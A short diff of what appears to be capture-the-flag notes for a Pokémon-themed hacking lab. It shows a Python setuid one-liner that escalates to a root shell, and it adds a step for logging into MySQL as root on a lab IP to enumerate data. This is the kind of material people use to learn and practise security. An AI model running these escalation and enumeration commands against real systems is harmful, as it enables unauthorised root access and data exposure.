@@ -29,6 +29,10 @@ python3
 
 #./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ____________________________________________________________________________________________________________________________
+Use our mysql command with different host IP to enumerate information
+
+#mysql -u root -h 10.10.133.1 -p
+____________________________________________________________________________________________________________________________
 </div>
         <pokemon>:<hack_the_pokemon>
         	<!--(Check console for extra surprise!)-->
